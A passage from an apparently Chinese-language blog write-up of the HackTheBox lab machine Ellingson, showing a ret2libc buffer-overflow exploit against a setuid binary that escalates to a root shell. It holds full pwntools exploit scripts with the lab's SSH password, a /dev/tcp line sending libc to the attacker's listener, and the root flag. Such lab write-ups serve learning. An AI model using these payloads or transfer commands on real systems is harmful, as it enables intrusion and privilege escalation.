class=\"hljs-built_in\"\u003edisable\u003c/span\u003e this functionality, \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e the contents of /root/.cache/.pwntools-cache-3.13/update to \u003cspan class=\"hljs-string\"\u003e'never'\u003c/span\u003e (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e检查一下是否开启了 \u003ccode\u003eALSR\u003c/code\u003e ，开启了完全\u003ccode\u003eALSR\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /proc/sys/kernel/randomize_va_space\n2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里要使用 \u003ccode\u003eret2libc\u003c/code\u003e 攻击\u003c/p\u003e\n\u003ch3\u003e寻找一个真实的地址\u003c/h3\u003e\n\u003cp\u003e首先我们查看\u003ccode\u003elibc\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003e/lib/x86_64-linux-gnu/libc.so.6\u003c/code\u003e下载到靶机中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// kali\n➜  Ellingson nc -lvp 1234 \u003e libc.so.6\n// Machine\nmargo@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /lib/x86_64-linux-gnu/libc.so.6 \u003e /dev/tcp/your-ip/1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e首先判断填充值，这里使用\u003ccode\u003egarbage\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson pwndbg garbage \npwndbg\u003e cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg\u003e run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u003cspan class=\"hljs-string\"\u003e\"/lib/x86_64-linux-gnu/libthread_db.so.1\"\u003c/span\u003e.\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e程序果不其然崩溃了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e计算偏移值，这里使用\u003ccode\u003emsf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到偏移值\u003ccode\u003e136\u003c/code\u003e （PS：这里使用\u003ccode\u003epwndbg\u003c/code\u003e的\u003ccode\u003ecyclic\u003c/code\u003e无法得到正确偏移值，但是\u003ccode\u003eWP\u003c/code\u003e中使用\u003ccode\u003egef\u003c/code\u003e等都可以很容易就得到偏移值）\u003c/p\u003e\n\u003cp\u003e得到偏移值后，我们选择一下获得哪个\u003ccode\u003eplt\u003c/code\u003e函数的真实地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e@plt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ex64\u003c/code\u003e 传参需要使用寄存器，\u003ccode\u003e0x000000000040179b\u003c/code\u003e 符合\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson ROPgadget --binary garbage --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里选择获得\u003ccode\u003eputs@plt\u003c/code\u003e ，我们通过\u003ccode\u003epwn\u003c/code\u003e连接\u003ccode\u003essh\u003c/code\u003e 来调试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_add = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_add:{hex(puts_real_add)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行后我们的得到了\u003ccode\u003eput\u003c/code\u003e的真实地址\u003ccode\u003e0x7f8eed3569c0\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_add:0x7f8eed3569c0\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e得到基地址\u003c/h3\u003e\n\u003cp\u003e基地址 = puts 函数真实地址 - puts 函数偏移地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e获得其他地址\u003c/h3\u003e\n\u003cp\u003e得到基地址后，我们要得到 \u003ccode\u003esystem\u003c/code\u003e 和 \u003ccode\u003e/bin/sh\u003c/code\u003e的地址\u003c/p\u003e\n\u003cp\u003e函数真实地址 = 基地址 + 函数偏移值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGetShell\u003c/h3\u003e\n\u003cp\u003e得到需要的地址后，我们可以进行获取\u003ccode\u003eShell\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e再此之前，我们还需要一个\u003ccode\u003eret\u003c/code\u003e来实现堆栈平衡\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson ROPgadget --binary garbage --only \u003cspan class=\"hljs-string\"\u003e\"ret\"\u003c/span\u003e    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\nret_addr = 0x0000000000401016\n\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们运行，但是权限只是 \u003ccode\u003emargo\u003c/code\u003e的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ $ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1002(margo) gid=1002(margo) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(margo)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGetRootShell\u003c/h3\u003e\n\u003cp\u003e我们还需要进行将\u003ccode\u003eshell\u003c/code\u003e权限提升，可以使用\u003ccode\u003esetuid\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'setuid'\u003c/span\u003e]\n\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行获得 \u003ccode\u003eRootShell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n\u003cspan class=\"hljs-comment\"\u003e# $ id\u003c/span\u003e\nuid=0(root) gid=1002(margo) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(margo)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# $ cat /root/root.txt\u003c/span\u003e\nd87f7aac2d13c429b8d30e11be174dd6\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e爽。\u003c/p\u003e\n\u003cp\u003e打到缓冲区溢出无从下手，花了一天多时间恶补\u003ccode\u003eROP\u003c/code\u003e ，然后一命通关\u003c/p\u003e\n\u003cp\u003e太爽了。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/vibePls-4x.gif\" alt=\"image.gif\"\u003e\u003c/p\u003e","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","updated":"2025-06-15","tags":["HackTheBox","Linux","PWN","ret2libc","Crack"],"categories":"靶机","comments":true,"description":"Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon 访问HTTP 